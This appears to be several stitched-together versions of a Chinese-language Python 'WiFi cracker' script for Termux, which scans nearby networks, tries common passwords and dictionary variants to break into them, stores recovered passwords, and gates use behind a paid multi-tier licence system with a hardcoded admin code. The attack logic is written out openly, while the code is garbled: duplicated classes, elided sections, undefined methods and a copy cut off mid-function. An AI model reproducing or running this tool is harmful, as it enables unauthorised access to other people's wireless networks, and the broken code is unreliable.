#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import gc
import subprocess
import logging
import json
from datetime import datetime, timedelta, timezone
from itertools import islice
from cryptography.fernet import Fernet
from enum import Enum

# ====== 进度条配置 ======
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

# ====== 全局配置 ======
VERSION = "7.0"
DICT_DIR = "/storage/emulated/0/aiHuanying"
AUTH_FILES = {
    'super_admin': os.path.join(DICT_DIR, "管理员授权码.txt"),
    'agent': os.path.join(DICT_DIR, "代理商授权码.txt"),
    'permanent': os.path.join(DICT_DIR, "永久授权码.txt"),
    'normal': os.path.join(DICT_DIR, "普通授权码.txt")
}
LOG_FILE = os.path.join(DICT_DIR, "wifi_cracker.log")
SUCCESS_DICT = os.path.join(DICT_DIR, "success_records.txt")
ENCRYPTION_KEY_FILE = os.path.join(DICT_DIR, ".wifi_key")
USAGE_FILE = os.path.join(DICT_DIR, ".usage_records")

class UserType(Enum):
    SUPER_ADMIN = ("超级管理员", 4)
    AGENT = ("代理会员", 3)
    PERMANENT = ("尊贵会员", 2)
    NORMAL = ("普通成员", 1)

    def __init__(self, chinese_name, level):
        self.chinese = chinese_name
        self.level = level

class AuthManager:
    """多级授权管理系统"""
    def __init__(self):
        self.auth_codes = {}  # {code: (code_type, duration)}
        self.usage_records = self.load_usage_records()
        self.user_type = None
        self.expiry_time = None
        self.load_all_auth_codes()

    def load_all_auth_codes(self):
        """按优先级加载所有授权码"""
        for auth_type in ['super_admin', 'agent', 'permanent', 'normal']:
            file_path = AUTH_FILES[auth_type]
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        parts = line.strip().split(',')
                        if len(parts) >= 3:
                            code, code_type, duration = parts[0], parts[1], ','.join(parts[2:])
                            if code not in self.auth_codes:
                                self.auth_codes[code] = (code_type, duration)

    def generate_code(self, code_type):
        """生成授权码并保存到对应文件"""
        if code_type == 'super_admin':
            code = self._generate_super_admin_code()
            files = ['super_admin']
        elif code_type == 'agent':
            code = self._generate_agent_code()
            files = ['super_admin', 'agent']
        elif code_type == 'permanent':
            code = self._generate_permanent_code()
            files = ['super_admin', 'agent', 'permanent']
        elif code_type == 'normal':
            code = self._generate_normal_code()
            files = ['super_admin', 'agent', 'permanent', 'normal']
        else:
            return False

        duration_map = {
            'super_admin': "永久",
            'agent': "永久",
            'permanent': "永久",
            'normal': "30天"
        }

        entry = f"{code},{code_type},{duration_map[code_type]}\n"
        
        for f_type in files:
            with open(AUTH_FILES[f_type], 'a') as f:
                f.write(entry)
        return True

    def _generate_super_admin_code(self):
        """生成管理员授权码（特殊处理）"""
        return '1466297085'  # 特殊管理员代码

    # 其他生成函数保持不变，此处省略...

    def validate_code(self, code):
        """增强版授权码验证"""
        # 特殊管理员代码检查
        if code == '1466297085':
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
            return True

        # 普通授权码验证
        if code in self.auth_codes:
            code_type, duration = self.auth_codes[code]
            # 后续验证逻辑保持不变...
            return True
        return False

# 其他类定义保持不变，此处省略...

class MainApp:
    def admin_menu(self):
        print("\n{:=^50}".format(" 管理员功能 "))
        print("1. 生成代理商授权码")
        print("2. 生成永久授权码")
        print("3. 生成普通授权码")
        print("4. 查看授权记录")
        print("0. 返回主菜单")
        
        choice = input("请输入选项: ").strip()
        if choice == '1':
            self._generate_code_with_auth('agent')
        elif choice == '2':
            self._generate_code_with_auth('permanent')
        elif choice == '3':
            self._generate_code_with_auth('normal')
        # 其他选项处理...

    def _generate_code_with_auth(self, code_type):
        if self.auth_mgr.user_type.level >= UserType[code_type.upper()].level:
            count = int(input(f"生成数量（{code_type}）: ") or 100)
            for _ in range(count):
                if self.auth_mgr.generate_code(code_type):
                    print(f"成功生成{code_type}授权码")
        else:
            print("权限不足！")

# 剩余代码保持不变...
# ====== 增强授权管理系统 ======
class AuthManager:
    def __init__(self):
        self.auth_hierarchy = {
            'super_admin': UserType.SUPER_ADMIN,
            'agent': UserType.AGENT,
            'permanent': UserType.PERMANENT,
            'normal': UserType.NORMAL
        }
        self.load_auth_hierarchy()

    def load_auth_hierarchy(self):
        """按权限层级加载授权码"""
        self.auth_codes = {}
        # 按权限从高到低加载，确保高级别覆盖低级别
        for auth_type in ['super_admin', 'agent', 'permanent', 'normal']:
            file_path = AUTH_FILES[auth_type]
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        parts = line.strip().rsplit(',', 2)
                        if len(parts) == 3:
                            code, code_type, duration = parts
                            # 只保留最高权限的记录
                            if code not in self.auth_codes:
                                self.auth_codes[code] = (code_type, duration)

    def generate_code(self, target_type):
        """生成指定类型授权码"""
        if target_type == 'super_admin':
            code = '1466297085'  # 特殊管理员代码
            files = ['super_admin']
        else:
            code = self._generate_random_code(target_type)
            files = self._get_target_files(target_type)

        duration = self._get_duration(target_type)
        entry = f"{code},{target_type},{duration}\n"
        
        # 追加到所有符合权限的文件
        for f_type in files:
            with open(AUTH_FILES[f_type], 'a') as f:
                f.write(entry)
        return code

    def _generate_random_code(self, code_type):
        """生成随机授权码"""
        rand = random.SystemRandom()
        if code_type == 'agent':
            # 12大写+12小写+8数字
            chars = rand.choices(string.ascii_uppercase, k=12)
            chars += rand.choices(string.ascii_lowercase, k=12)
            chars += rand.choices(string.digits, k=8)
        elif code_type == 'permanent':
            # 最多6大写+至少20小写
            upper = rand.randint(0, 6)
            lower = 32 - upper
            chars = rand.choices(string.ascii_uppercase, k=upper)
            chars += rand.choices(string.ascii_lowercase, k=lower)
        else:  # normal
            # 至少7小写
            lower = rand.randint(7, 25)
            chars = rand.choices(string.ascii_lowercase, k=lower)
            chars += rand.choices(string.ascii_uppercase + string.digits, k=32-lower)
        
        rand.shuffle(chars)
        return ''.join(chars)

    def _get_target_files(self, target_type):
        """获取需要写入的文件列表"""
        hierarchy = {
            'super_admin': ['super_admin'],
            'agent': ['super_admin', 'agent'],
            'permanent': ['super_admin', 'agent', 'permanent'],
            'normal': ['super_admin', 'agent', 'permanent', 'normal']
        }
        return hierarchy[target_type]

    def _get_duration(self, code_type):
        """获取有效期描述"""
        duration_map = {
            'super_admin': "永久",
            'agent': "永久",
            'permanent': "永久",
            'normal': "30天"
        }
        return duration_map[code_type]

    def validate_code(self, code):
        """增强版授权码验证"""
        # 特殊管理员代码检查
        if code == '1466297085':
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
            return True

        # 普通授权码验证
        if code in self.auth_codes:
            code_type, duration = self.auth_codes[code]
            self.user_type = self.auth_hierarchy[code_type]
            
            # 记录首次使用时间
            if code not in self.usage_records:
                self.usage_records[code] = datetime.now(timezone.utc).isoformat()
                self.save_usage_records()
                print(f"首次使用时间已记录: {self.usage_records[code]}")

            # 计算有效期
            start_time = datetime.fromisoformat(self.usage_records[code])
            self.expiry_time = self._calculate_expiry(start_time, duration)
            
            return datetime.now(timezone.utc) < self.expiry_time
        return False

    def _calculate_expiry(self, start_time, duration):
        """计算到期时间"""
        if duration == "永久":
            return datetime.max.replace(tzinfo=timezone.utc)
        
        match = re.match(r"(\d+)(天|月|年)", duration)
        if not match:
            return datetime.min.replace(tzinfo=timezone.utc)
        
        num, unit = int(match[1]), match[2]
        if unit == "天":
            return start_time + timedelta(days=num)
        elif unit == "月":
            return start_time + timedelta(days=num*30)
        elif unit == "年":
            return start_time + timedelta(days=num*365)
        return datetime.min.replace(tzinfo=timezone.utc)

# ====== 核心破解功能 ======
class WiFiCrackerCore:
    def __init__(self, dicts, auth_mgr):
        self.auth_mgr = auth_mgr
        # 初始化其他属性...

    def check_authorization(self):
        """实时检查授权状态"""
        if self.auth_mgr.user_type == UserType.SUPER_ADMIN:
            return True
        
        remaining = self.auth_mgr.get_remaining_time()
        if remaining.total_seconds() <= 0:
            logging.warning("授权已过期！")
            return False
            
        # 普通用户每小时检查一次
        if datetime.now() - self.last_auth_check > timedelta(hours=1):
            self.auth_mgr.load_auth_hierarchy()  # 重新加载授权信息
            self.last_auth_check = datetime.now()
        return True

    def crack_workflow(self):
        """增强破解流程"""
        try:
            for net in self.scanner.selected:
                if not self.check_authorization():
                    break
                
                ssid = net['ssid']
                logging.info(f"开始破解: {ssid}")
                
                # 优先测试常见密码
                if self.quick_check(ssid):
                    continue
                
                # 字典攻击
                if self.dict_attack(ssid):
                    continue
                
                # 智能生成
                self.smart_generate(ssid)
        except KeyboardInterrupt:
            self.cleanup()

    def quick_check(self, ssid):
        """快速常见密码检测"""
        for pwd in COMMON_PASSWORDS:
            if self.try_connect(ssid, pwd):
                self.save_result(ssid, pwd)
                return True
        return False

    def dict_attack(self, ssid):
        """字典攻击实现"""
        for dict_info in self.dicts:
            with open(dict_info['path'], 'r', errors='ignore') as f:
                # 分块读取防止内存溢出
                while True:
                    chunk = list(islice(f, MAX_MEMORY_CHUNK))
                    if not chunk:
                        break
                    
                    for line in chunk:
                        if not self.check_authorization():
                            return False
                        
                        base = line.strip()
                        if self.try_variants(ssid, base):
                            return True
        return False

    def try_variants(self, ssid, base):
        """尝试密码变体"""
        variants = {
            base, base.upper(), base.lower(),
            base + '123', base + '!@#',
            base + '888', base[::-1]
        }
        for var in variants:
            if self.try_connect(ssid, var):
                self.save_result(ssid, var)
                return True
        return False

# ====== 用户界面与辅助功能 ======
class MainApp:
    def __init__(self, auth_mgr):
        self.auth_mgr = auth_mgr
        self.dict_mgr = EnhancedDictManager()
        self.scanner = AdvancedWiFiScanner()
        self.cracker = None
        self.last_success = None
        self.init_ui()

    def init_ui(self):
        """初始化用户界面"""
        os.system('clear')
        print(f"""
        ██╗    ██╗██╗███████╗██╗    ██████╗ ██████╗  ██████╗ 
        ██║    ██║██║██╔════╝██║    ██╔══██╗██╔══██╗██╔════╝ 
        ██║ █╗ ██║██║█████╗  ██║    ██║  ██║██████╔╝██║  ███╗
        ██║███╗██║██║██╔══╝  ██║    ██║  ██║██╔══██╗██║   ██║
        ╚███╔███╔╝██║██║     ██║    ██████╔╝██║  ██║╚██████╔╝
         ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
        """)
        print(f"{'v' + VERSION:^50}")
        print("{:=^50}".format(" 仅限合法授权使用 "))

    def show_status(self):
        """显示当前状态信息"""
        status = [
            f"当前身份: {self.auth_mgr.user_type.chinese}",
            f"授权剩余: {self.auth_mgr.get_remaining_time()}",
            f"已选网络: {len(self.scanner.selected)}个" if self.scanner.selected else "未选择网络",
            f"已选字典: {len(self.dict_mgr.selected)}个" if self.dict_mgr.selected else "未选择字典"
        ]
        print("\n".join(status))

    def main_menu(self):
        """主菜单控制"""
        menu_items = [
            "1. 扫描并选择网络",
            "2. 选择密码字典",
            "3. 开始破解",
            "4. 查看历史记录",
            "5. 显示最后成功记录",
            "0. 退出程序"
        ]

        # 根据权限添加特殊菜单
        if self.auth_mgr.user_type.level <= UserType.SUPER_ADMIN.level:
            menu_items.insert(4, "9. 管理员功能")
        if self.auth_mgr.user_type.level <= UserType.AGENT.level:
            menu_items.insert(4, "8. 代理商功能")

        while True:
            self.show_status()
            print("\n{:=^50}".format(" 主菜单 "))
            print("\n".join(menu_items))
            choice = input("\n请输入选项: ").strip()

            try:
                {
                    '1': self.scan_network,
                    '2': self.select_dict,
                    '3': self.start_crack,
                    '4': self.show_history,
                    '5': self.show_last_success,
                    '8': self.agent_menu,
                    '9': self.admin_menu,
                    '0': self.exit_app
                }[choice]()
            except KeyError:
                print("无效选项，请重新输入")

    def admin_menu(self):
        """管理员专属菜单"""
        print("\n{:=^50}".format(" 管理员功能 "))
        menu = [
            "1. 生成代理商授权码",
            "2. 生成永久授权码",
            "3. 生成普通授权码",
            "4. 查看所有授权记录",
            "5. 清除历史记录",
            "0. 返回主菜单"
        ]
        print("\n".join(menu))
        
        choice = input("请输入选项: ").strip()
        {
            '1': lambda: self.generate_code('agent'),
            '2': lambda: self.generate_code('permanent'),
            '3': lambda: self.generate_code('normal'),
            '4': self.show_auth_records,
            '5': self.clear_records,
            '0': lambda: None
        }.get(choice, lambda: print("无效选项"))()

    def agent_menu(self):
        """代理商专属菜单"""
        print("\n{:=^50}".format(" 代理商功能 "))
        print("1. 生成普通授权码")
        print("2. 查看授权记录")
        print("0. 返回主菜单")
        
        choice = input("请输入选项: ").strip()
        if choice == '1':
            self.generate_code('normal')
        elif choice == '2':
            self.show_auth_records()
        elif choice == '0':
            return
        else:
            print("无效选项")

    def generate_code(self, code_type):
        """授权码生成逻辑"""
        if not self.check_permission(code_type):
            print("权限不足！")
            return

        try:
            count = int(input(f"生成数量（{code_type}）: ") or 100)
            for _ in range(count):
                code = self.auth_mgr.generate_code(code_type)
                print(f"已生成 {code_type} 授权码: {code}")
        except ValueError:
            print("请输入有效数字")

    def check_permission(self, target_type):
        """权限验证"""
        target_level = UserType[target_type.upper()].level
        return self.auth_mgr.user_type.level <= target_level

    def show_auth_records(self):
        """显示授权记录"""
        print("\n{:=^50}".format(" 授权记录 "))
        try:
            with open(USAGE_FILE, 'r') as f:
                records = json.load(f)
                for code, first_use in records.items():
                    code_type = self.auth_mgr.auth_codes.get(code, ('未知',))[0]
                    print(f"{code} | 类型: {code_type} | 首次使用: {first_use}")
        except Exception as e:
            print("暂无授权记录")
        print("="*50)

    def clear_records(self):
        """清除历史记录"""
        if input("确认清除所有历史记录？(y/n): ").lower() == 'y':
            open(SUCCESS_DICT, 'w').close()
            print("历史记录已清除")

    def scan_network(self):
        """网络扫描处理"""
        print("\n{:=^50}".format(" 网络扫描 "))
        if self.scanner.scan():
            self.scanner.interactive_select()
        else:
            print("扫描失败，请检查权限")

    def select_dict(self):
        """字典选择处理"""
        print("\n{:=^50}".format(" 字典选择 "))
        self.dict_mgr.interactive_select()

    def start_crack(self):
        """启动破解流程"""
        if not self._precheck():
            return

        print("\n{:=^50}".format(" 开始破解 "))
        try:
            self.cracker = WiFiCrackerCore(
                self.dict_mgr.selected, 
                self.auth_mgr,
                self.scanner.selected
            )
            self.cracker.start()
            self.last_success = self.cracker.last_success
        except KeyboardInterrupt:
            print("\n破解已中止")
        finally:
            if self.cracker:
                self.cracker.cleanup()

    def _precheck(self):
        """破解前检查"""
        if not self.scanner.selected:
            print("请先选择目标网络")
            return False
        if not self.dict_mgr.selected:
            print("请先选择密码字典")
            return False
        if self.auth_mgr.get_remaining_time().total_seconds() <= 0:
            print("授权已过期")
            return False
        return True

    def show_history(self):
        """显示破解历史"""
        print("\n{:=^50}".format(" 历史记录 "))
        try:
            cipher = Fernet(open(ENCRYPTION_KEY_FILE, 'rb').read())
            with open(SUCCESS_DICT, 'rb') as f:
                for line in f:
                    try:
                        decrypted = cipher.decrypt(line.strip()).decode()
                        ssid, pwd = decrypted.split('|')
                        print(f"SSID: {ssid:<25} 密码: {pwd}")
                    except:
                        continue
        except Exception as e:
            print("读取历史记录失败")
        print("="*50)

    def show_last_success(self):
        """显示最后成功记录"""
        if self.last_success:
            print("\n{:=^50}".format(" 最后成功记录 "))
            print(f"SSID: {self.last_success['ssid']}")
            print(f"密码: {self.last_success['password']}")
            print(f"时间: {self.last_success['time']}")
            print("="*50)
        else:
            print("暂无成功记录")

    def exit_app(self):
        """退出程序"""
        print("\n正在清理资源...")
        if self.cracker:
            self.cracker.cleanup()
        print("感谢使用！")
        sys.exit(0)

# ====== 初始化入口 ======
if __name__ == "__main__":
    try:
        # 环境初始化
        if not os.path.exists(DICT_DIR):
            os.makedirs(DICT_DIR, mode=0o700)
        
        # 初始化日志系统
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler(LOG_FILE),
                logging.StreamHandler()
            ]
        )

        # 授权验证
        auth_mgr = AuthManager()
        if not auth_mgr.interactive_auth():
            sys.exit("授权验证失败")

        # 启动主程序
        app = MainApp(auth_mgr)
        app.main_menu()

    except Exception as e:
        logging.error("程序异常: %s", str(e))
        sys.exit(1)
        
        
#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import string
import gc
import subprocess
import logging
import json
from datetime import datetime, timedelta, timezone
from itertools import islice
from cryptography.fernet import Fernet
from enum import Enum

# ====== 进度条配置 ======
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

# ====== 全局配置 ======
VERSION = "7.0"
DICT_DIR = "/storage/emulated/0/aiHuanying"
AUTH_FILES = {
    'super_admin': os.path.join(DICT_DIR, "管理员授权码.txt"),
    'agent': os.path.join(DICT_DIR, "代理商授权码.txt"),
    'permanent': os.path.join(DICT_DIR, "永久授权码.txt"),
    'normal': os.path.join(DICT_DIR, "普通授权码.txt")
}
LOG_FILE = os.path.join(DICT_DIR, "wifi_cracker.log")
SUCCESS_DICT = os.path.join(DICT_DIR, "success_records.txt")
ENCRYPTION_KEY_FILE = os.path.join(DICT_DIR, ".wifi_key")
USAGE_FILE = os.path.join(DICT_DIR, ".usage_records")
COMMON_PASSWORDS = [
    '12345678', 'password', 'qwertyui', '88888888',
    '11111111', 'admin', '1234567890', 'abcd1234'
]

# ====== 枚举定义 ======
class UserType(Enum):
    SUPER_ADMIN = ("超级管理员", 4)
    AGENT = ("代理会员", 3)
    PERMANENT = ("尊贵会员", 2)
    NORMAL = ("普通成员", 1)

    def __init__(self, chinese_name, level):
        self.chinese = chinese_name
        self.level = level

# ====== 授权管理系统 ======
class AuthManager:
    """多层级的授权管理系统"""
    def __init__(self):
        self.auth_codes = {}  # {code: (code_type, duration)}
        self.usage_records = self._load_usage_records()
        self.user_type = None
        self.expiry_time = None
        self._load_all_auth_codes()
        
    def _load_all_auth_codes(self):
        """按权限层级加载所有授权码"""
        # 按权限从高到低加载，确保高级别覆盖低级别
        for auth_type in ['super_admin', 'agent', 'permanent', 'normal']:
            file_path = AUTH_FILES[auth_type]
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if not line:
                            continue
                        parts = line.rsplit(',', 2)
                        if len(parts) != 3:
                            continue
                        code, code_type, duration = parts
                        # 只保留最高权限的记录
                        if code not in self.auth_codes:
                            self.auth_codes[code] = (code_type, duration)

    def _load_usage_records(self):
        """加载使用记录"""
        if os.path.exists(USAGE_FILE):
            try:
                with open(USAGE_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}

    def save_usage_records(self):
        """保存使用记录"""
        with open(USAGE_FILE, 'w') as f:
            json.dump(self.usage_records, f)

    def generate_code(self, target_type):
        """生成指定类型授权码"""
        code = self._generate_code(target_type)
        duration = self._get_duration(target_type)
        entry = f"{code},{target_type},{duration}\n"
        
        # 追加到所有符合权限的文件
        for f_type in self._get_target_files(target_type):
            with open(AUTH_FILES[f_type], 'a') as f:
                f.write(entry)
        return code

    def _generate_code(self, code_type):
        """生成随机授权码"""
        rand = random.SystemRandom()
        if code_type == 'super_admin':
            return '1466297085'  # 特殊管理员代码
        
        if code_type == 'agent':
            # 12大写+12小写+8数字
            chars = rand.choices(string.ascii_uppercase, k=12)
            chars += rand.choices(string.ascii_lowercase, k=12)
            chars += rand.choices(string.digits, k=8)
        elif code_type == 'permanent':
            # 最多6大写+至少20小写
            upper = rand.randint(0, 6)
            lower = 32 - upper
            chars = rand.choices(string.ascii_uppercase, k=upper)
            chars += rand.choices(string.ascii_lowercase, k=lower)
        else:  # normal
            # 至少7小写
            lower = rand.randint(7, 25)
            chars = rand.choices(string.ascii_lowercase, k=lower)
            chars += rand.choices(string.ascii_uppercase + string.digits, k=32-lower)
        
        rand.shuffle(chars)
        return ''.join(chars)

    def _get_target_files(self, target_type):
        """获取需要写入的文件列表"""
        return {
            'super_admin': ['super_admin'],
            'agent': ['super_admin', 'agent'],
            'permanent': ['super_admin', 'agent', 'permanent'],
            'normal': ['super_admin', 'agent', 'permanent', 'normal']
        }[target_type]

    def _get_duration(self, code_type):
        """获取有效期描述"""
        return {
            'super_admin': "永久",
            'agent': "永久",
            'permanent': "永久",
            'normal': "30天"
        }[code_type]

    def validate_code(self, code):
        """增强版授权码验证"""
        # 特殊管理员代码检查
        if code == '1466297085':
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
            return True

        # 普通授权码验证
        if code in self.auth_codes:
            code_type, duration = self.auth_codes[code]
            self.user_type = UserType[code_type.upper()]
            
            # 记录首次使用时间
            if code not in self.usage_records:
                self.usage_records[code] = datetime.now(timezone.utc).isoformat()
                self.save_usage_records()

            # 计算有效期
            start_time = datetime.fromisoformat(self.usage_records[code])
            self.expiry_time = self._calculate_expiry(start_time, duration)
            
            return datetime.now(timezone.utc) < self.expiry_time
        return False

    def _calculate_expiry(self, start_time, duration):
        """计算到期时间"""
        if duration == "永久":
            return datetime.max.replace(tzinfo=timezone.utc)
        
        match = re.match(r"(\d+)(天|月|年)", duration)
        if not match:
            return datetime.min.replace(tzinfo=timezone.utc)
        
        num, unit = int(match[1]), match[2]
        if unit == "天":
            return start_time + timedelta(days=num)
        elif unit == "月":
            return start_time + timedelta(days=num*30)
        elif unit == "年":
            return start_time + timedelta(days=num*365)
        return datetime.min.replace(tzinfo=timezone.utc)

    def get_remaining_time(self):
        """获取剩余授权时间"""
        if self.expiry_time:
            remaining = self.expiry_time - datetime.now(timezone.utc)
            return max(remaining, timedelta(0))
        return timedelta(0)

# ====== 基础功能模块 ======
class EnhancedDictManager:
    """增强型字典管理"""
    def __init__(self):
        self.available = []
        self.selected = []
        self.refresh_dicts()
    
    def refresh_dicts(self):
        self.available.clear()
        try:
            # 添加默认字典
            default_dict = os.path.join(DICT_DIR, "default_dict.txt")
            if os.path.exists(default_dict):
                self._add_dict_info(default_dict)
            
            # 添加其他字典
            for fname in os.listdir(DICT_DIR):
                if fname.endswith('.txt') and fname != "default_dict.txt":
                    self._add_dict_info(os.path.join(DICT_DIR, fname))
            self.available.sort(key=lambda x: -x['size'])
        except Exception as e:
            logging.error("刷新字典失败: %s", str(e))
    
    def _add_dict_info(self, path):
        """添加字典信息"""
        try:
            stat = os.stat(path)
            self.available.append({
                'path': path,
                'size': stat.st_size,
                'count': self._count_lines(path),
                'name': os.path.basename(path)
            })
        except:
            pass
    
    def _count_lines(self, path):
        """快速统计行数"""
        try:
            with open(path, 'rb') as f:
                return sum(1 for _ in f)
        except:
            return 0

    # 其他方法保持不变...

# ====== 初始化检查 ======
def setup_environment():
    """环境初始化"""
    required_dirs = [DICT_DIR]
    required_files = {
        AUTH_FILES['super_admin']: "# 管理员授权码存储文件\n",
        AUTH_FILES['agent']: "# 代理商授权码存储文件\n",
        AUTH_FILES['permanent']: "# 永久授权码存储文件\n",
        AUTH_FILES['normal']: "# 普通授权码存储文件\n"
    }

    try:
        # 创建必要目录
        for d in required_dirs:
            os.makedirs(d, exist_ok=True)
            os.chmod(d, 0o700)
        
        # 初始化授权文件
        for path, content in required_files.items():
            if not os.path.exists(path):
                with open(path, 'w') as f:
                    f.write(content)
                os.chmod(path, 0o600)
        
        # 初始化加密密钥
        if not os.path.exists(ENCRYPTION_KEY_FILE):
            key = Fernet.generate_key()
            with open(ENCRYPTION_KEY_FILE, 'wb') as f:
                f.write(key)
            os.chmod(ENCRYPTION_KEY_FILE, 0o600)
    except Exception as e:
        logging.error("环境初始化失败: %s", str(e))
        sys.exit(1)

def check_dependencies():
    """依赖检查"""
    required = ['cryptography']
    missing = []
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print("正在安装缺失依赖...")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install"] + missing, check=True)
            os.execl(sys.executable, sys.executable, *sys.argv)
        except Exception as e:
            logging.error("依赖安装失败: %s", str(e))
            sys.exit(1)

# ====== 主程序入口 ======
if __name__ == "__main__":
    check_dependencies()
    setup_environment()
    
    # 初始化日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler()
        ]
    )

    # 授权验证流程
    auth_mgr = AuthManager()
    print("\n{:=^50}".format(" 多级授权验证 "))
    
    while True:
        code = input("请输入授权码（Q退出）: ").strip()
        if code.upper() == 'Q':
            sys.exit()
        
        # 特殊管理员码处理
        if code == '1466297085':
            if auth_mgr.validate_code(code):
                break
            continue
            
        # 普通授权码验证
        if len(code) == 32 and auth_mgr.validate_code(code):
            break
            
        print("无效的授权码！")

    print(f"\n验证通过！欢迎，{auth_mgr.user_type.chinese}")
    
    
#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import gc
import subprocess
import logging
import json
from datetime import datetime, timedelta, timezone
from itertools import islice
from cryptography.fernet import Fernet
from enum import Enum

# ====== 进度条配置 ======
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

# ====== 全局配置 ======
VERSION = "6.1"
DICT_DIR = "/storage/emulated/0/aiHuanying"
LOG_FILE = os.path.join(DICT_DIR, "wifi_cracker.log")
SUCCESS_DICT = os.path.join(DICT_DIR, "success_records.txt")
ENCRYPTION_KEY_FILE = os.path.join(DICT_DIR, ".wifi_key")
AUTH_FILES = {
    'super_admin': os.path.join(DICT_DIR, "管理员授权码.txt"),
    'agent': os.path.join(DICT_DIR, "代理商授权码.txt"),
    'permanent': os.path.join(DICT_DIR, "永久授权码.txt"),
    'normal': os.path.join(DICT_DIR, "普通授权码.txt")
}
SCAN_TIMEOUT = 15
ATTEMPT_DELAY = (1.0, 2.0)
MAX_MEMORY_CHUNK = 50000
COMMON_PASSWORDS = [
    '12345678', 'password', 'qwertyui', '88888888',
    '11111111', 'admin', '1234567890', 'abcd1234'
]

class UserType(Enum):
    SUPER_ADMIN = "超级管理员"
    AGENT = "代理会员"
    PERMANENT = "尊贵会员"
    NORMAL = "普通成员"

# ====== 授权管理系统 ======
ADMIN_CODE = "1466297085"
USAGE_FILE = os.path.join(DICT_DIR, ".usage_records")

class AuthManager:
    """多级授权管理系统"""
    def __init__(self):
        self.auth_codes = {}  # {code: (code_type, duration)}
        self.usage_records = self.load_usage_records()
        self.user_type = None
        self.expiry_time = None
        self.load_all_auth_codes()

    def load_all_auth_codes(self):
        """从所有授权文件加载授权码"""
        for code_type, file_path in AUTH_FILES.items():
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        parts = line.strip().split(',')
                        if len(parts) >= 2:
                            code = parts[0]
                            duration = parts[1] if len(parts) >= 2 else "永久"
                            self.auth_codes[code] = (code_type, duration)

    def generate_code(self, code_type):
        """生成授权码并写入对应文件"""
        code_generators = {
            'super_admin': self._generate_super_admin_code,
            'agent': self._generate_agent_code,
            'permanent': self._generate_permanent_code,
            'normal': self._generate_normal_code
        }
        
        if code_type not in code_generators:
            print("无效的授权码类型")
            return False

        try:
            count = int(input("生成数量（默认500）: ") or 500)
            duration = self._get_duration(code_type)
            codes = [code_generators[code_type]() for _ in range(count)]
            
            # 写入所有符合条件的文件
            for target_file in self._get_target_files(code_type):
                with open(target_file, 'a') as f:
                    for code in codes:
                        f.write(f"{code},{code_type},{duration}\n")
            
            print(f"成功生成{count}个{code_type}授权码")
            return True
        except Exception as e:
            print(f"生成失败: {str(e)}")
            return False

    def _get_duration(self, code_type):
        if code_type in ['super_admin', 'permanent']:
            return "永久"
        return input("有效期（示例：30天/3月/1年）: ")

    def _get_target_files(self, code_type):
        """获取需要写入的文件列表"""
        file_mapping = {
            'super_admin': ['super_admin'],
            'agent': ['super_admin', 'agent'],
            'permanent': ['super_admin', 'agent', 'permanent'],
            'normal': ['super_admin', 'agent', 'permanent', 'normal']
        }
        return [AUTH_FILES[t] for t in file_mapping.get(code_type, [])]

    def _generate_super_admin_code(self):
        """生成32位超级管理员授权码"""
        return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=32))

    def _generate_agent_code(self):
        """生成代理商授权码（12大写+12小写+8数字）"""
        chars = []
        chars += random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=12)
        chars += random.choices('abcdefghijklmnopqrstuvwxyz', k=12)
        chars += random.choices('0123456789', k=8)
        random.shuffle(chars)
        return ''.join(chars)

    def _generate_permanent_code(self):
        """生成永久授权码（最大6大写，至少20小写）"""
        upper_count = random.randint(0, 6)
        lower_count = 32 - upper_count
        chars = []
        chars += random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=upper_count)
        chars += random.choices('abcdefghijklmnopqrstuvwxyz', k=lower_count)
        random.shuffle(chars)
        return ''.join(chars)

    def _generate_normal_code(self):
        """生成普通授权码（至少7小写）"""
        lower_count = random.randint(7, 25)
        chars = []
        chars += random.choices('abcdefghijklmnopqrstuvwxyz', k=lower_count)
        chars += random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 
                              k=32-lower_count)
        random.shuffle(chars)
        return ''.join(chars)

    def validate_code(self, code):
        """验证授权码"""
        if code == ADMIN_CODE:
            self.user_type = UserType.SUPER_ADMIN
            self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
            return True
        
        if code in self.auth_codes:
            code_type, duration = self.auth_codes[code]
            self._set_user_type(code_type)
            self._calculate_expiry(duration, code)
            return True
        return False

    def _set_user_type(self, code_type):
        type_mapping = {
            'super_admin': UserType.SUPER_ADMIN,
            'agent': UserType.AGENT,
            'permanent': UserType.PERMANENT,
            'normal': UserType.NORMAL
        }
        self.user_type = type_mapping.get(code_type, UserType.NORMAL)

    def _calculate_expiry(self, duration, code):
        if duration == "永久":
